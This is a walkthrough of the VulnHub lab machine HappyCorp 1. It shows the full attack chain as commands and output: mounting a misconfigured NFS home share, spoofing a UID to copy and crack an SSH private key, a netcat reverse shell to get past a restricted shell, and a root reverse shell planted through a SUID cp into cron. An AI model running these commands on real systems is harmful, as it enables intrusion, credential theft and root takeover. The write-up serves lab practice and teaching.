---
title: VulnHub - HappyCorp 1
author: ret2x
date: 2022-08-10 16:28:25 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, nfs]
image:
    path: /assets/images/happycorp/front.png
---

**Description:** A linux machine serving a misconfigured NFS service. Unnecessary special permissions allowed gaining root privileges.

**Author:** Zayotic

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/happycorp-1,296/](https://www.vulnhub.com/entry/happycorp-1,296/)

## Information Gathering
### Host Discovery

The following ARP scan with netdiscover detected the target host.

```console
root@kali:~# netdiscover -i vmnet1 -r 172.16.178.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 162
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 172.16.178.134  00:0c:29:70:fd:7f      2     120  VMware, Inc.
 172.16.178.254  00:50:56:ef:3a:17      1      42  VMware, Inc.
```

### Port Scanning

The full TCP port scan with nmap discovered eigth open ports.

```console
root@kali:~# nmap -v -n -p1-65535 -T4 172.16.178.134 -oG nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
32911/tcp open  unknown
34569/tcp open  unknown
36269/tcp open  unknown
38457/tcp open  unknown
```

### Service Enumeration

In order to detect more information about open ports, scripting scanning and version detection was performed with nmap.

```console
root@kali:~# nmap -v -n -sCV -p22,80,111,2049,32911,34569,36269,38457 -Pn 172.16.178.134 -oN nmap/service-enum.txt
...
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 81:ea:90:61:be:0a:f2:8d:c3:4e:41:03:f0:07:8b:93 (RSA)
|   256 f6:07:4a:7e:1d:d8:cf:a7:cc:fd:fb:b3:18:ce:b3:af (ECDSA)
|_  256 64:9a:52:7b:75:b7:92:0d:4b:78:71:26:65:37:6c:bd (ED25519)
80/tcp    open  http     Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin.php
|_http-title: Happycorp
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: Apache/2.4.25 (Debian)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      33642/udp   mountd
|   100005  1,2,3      34569/tcp   mountd
|   100005  1,2,3      47349/tcp6  mountd
|   100005  1,2,3      47849/udp6  mountd
|   100021  1,3,4      36085/udp6  nlockmgr
|   100021  1,3,4      36269/tcp   nlockmgr
|   100021  1,3,4      38783/tcp6  nlockmgr
|   100021  1,3,4      55229/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
32911/tcp open  mountd   1-3 (RPC #100005)
34569/tcp open  mountd   1-3 (RPC #100005)
36269/tcp open  nlockmgr 1-4 (RPC #100021)
38457/tcp open  mountd   1-3 (RPC #100005)
```

## Enumeration
### Enumerating RPCBind + NFS

In the previous scan I noticed that the NFS service is running on the target machine, so I proceeded to enumerate this in order to identify network resources.

```console
root@kali:~# rpcinfo 172.16.178.134
...
100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            -          superuser
    100003    3    udp       0.0.0.0.8.1            nfs        superuser
    100003    4    udp       0.0.0.0.8.1            nfs        superuser
    100227    3    udp       0.0.0.0.8.1            -          superuser
    100003    3    tcp6      ::.8.1                 nfs        superuser
    100003    4    tcp6      ::.8.1                 nfs        superuser
    100227    3    tcp6      ::.8.1                 -          superuser
    100003    3    udp6      ::.8.1                 nfs        superuser
    100003    4    udp6      ::.8.1                 nfs        superuser
```

In the following command I found the karl’s home directory.

```console
root@kali:~# showmount -e 172.16.178.134
Export list for 172.16.178.134:
/home/karl *
```

## Exploitation
### Misconfigured NFS service

I mounted the shared directory on my attacking machine.

```console
root@kali:~# mount -t nfs -o vers=3 172.16.178.134:/home/karl /mnt -o nolock

root@kali:~# ls -la /mnt
total 28
drwxr-xr-x  3 1001 1001 4096 Mar  5  2019 .
drwxr-xr-x 18 root root 4096 Aug  8 20:12 ..
lrwxrwxrwx  1 root root    9 Mar  5  2019 .bash_history -> /dev/null
-rw-r--r--  1 1001 1001  220 Mar  4  2019 .bash_logout
-rw-r--r--  1 1001 1001 3538 Mar  5  2019 .bashrc
-rw-------  1 1001 1001   28 Mar  4  2019 .lesshst
-rw-r--r--  1 1001 1001  675 Mar  4  2019 .profile
drwx------  2 1001 1001 4096 Mar  5  2019 .ssh
```

But I do not have permissions to list the **.ssh** directory.

```console
root@kali:~# ls -la /mnt/.ssh
ls: cannot open directory '/mnt/.ssh': Permission denied
```

To fix this problem I had to create a new user with userid **1001** on the attacker machine.

```console
root@kali:~# useradd -u 1001 corpuser -s /usr/bin/zsh
root@kali:~# passwd corpuser
New password:
Retype new password:
passwd: password updated successfully
```

Then, I switched to the newly created user, and was possible to list the content in the **.ssh** directory.

```console
root@kali:~# su corpuser
kali% ls -la /mnt/.ssh
total 24
drwx------ 2 corpuser corpuser 4096 Mar  5  2019 .
drwxr-xr-x 3 corpuser corpuser 4096 Mar  5  2019 ..
-rw-r--r-- 1 corpuser corpuser  740 Mar  4  2019 authorized_keys
-rw------- 1 corpuser corpuser 3326 Mar  4  2019 id_rsa
-rw-r--r-- 1 corpuser corpuser  740 Mar  4  2019 id_rsa.pub
-rw-r--r-- 1 corpuser corpuser   18 Mar  4  2019 user.txt
```

I transfered with the following commands the private key to the attacking machine.

```console
kali% cp /mnt/.ssh/id_rsa /tmp
kali% exit

root@kali:~# mv /tmp/id_rsa .
```

I coverted the private key to a hash format, to can use it with john.

```console
root@kali:~# ssh2john id_rsa > hash_id_rsa.txt
```

I performed a dictionary attack against the hash, and a few seconds I found the password.

```console
root@kali:~# john hash_id_rsa.txt
...
sheep            (id_rsa)
```

I granted to the private key write and read permissions, and logged in via SSH as the user **karl**.

```console
root@kali:~# chmod 400 id_rsa
root@kali:~# ssh -l karl 172.16.178.134 -i id_rsa
The authenticity of host '172.16.178.134 (172.16.178.134)' can\'t be established.
ED25519 key fingerprint is SHA256:OgzwYRlM7h5bXbWancj8dQk7eP1k25uSijalWsnKWVQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.178.134' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Linux happycorp 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Mar  5 05:10:07 2019 from 192.168.207.129
id
```

I noticed a jailed shell that limits the execution of system commands, so to bypass this I used the following ssh command.

```console
root@kali:~# ssh -l karl 172.16.178.134 -i id_rsa 'nc 172.16.178.1 443 -e /bin/bash'
Enter passphrase for key 'id_rsa':
id
uid=1001(karl) gid=1001(karl) groups=1001(karl)
```

I found the first flag in the **.ssh** directory.

```console
cat .ssh/user.txt
flag1{z29vZGJveQ}
```

## Privilege Escalation
### SUID Binary

Listing the SUID binaries, I found the **cp** command.

```console
find / -perm -u=s -type f 2>/dev/null
...
/bin/cp
...
```

I used the following commands to create a bash reverse shell that executes every minute as a cron job.

```console
echo -e "* * * * * root bash -c 'bash -i >& /dev/tcp/172.16.178.1/1234 0>&1'\n" > /tmp/sysfile
cp /tmp/sysfile /etc/cron.d/
```

I started a netcat listener on port 443, and after a minute I got a root shell.

```console
root@kali:~# nc -vlnp 1234
listening on [any] 1234 ...
connect to [172.16.178.1] from (UNKNOWN) [172.16.178.134] 60298
bash: cannot set terminal process group (9187): Inappropriate ioctl for device
bash: no job control in this shell
root@happycorp:~# whoami
whoami
root
```

Finally was found the last flag.

```console
root@happycorp:~# cat root.txt
cat root.txt
Congrats!
flag2{aGFja2VyZ29k}
Here is some useless ascii art :)
           ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |                 |  |  |     |         |      |
     |  |  Hacker God     |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"


 -Zayotic
```
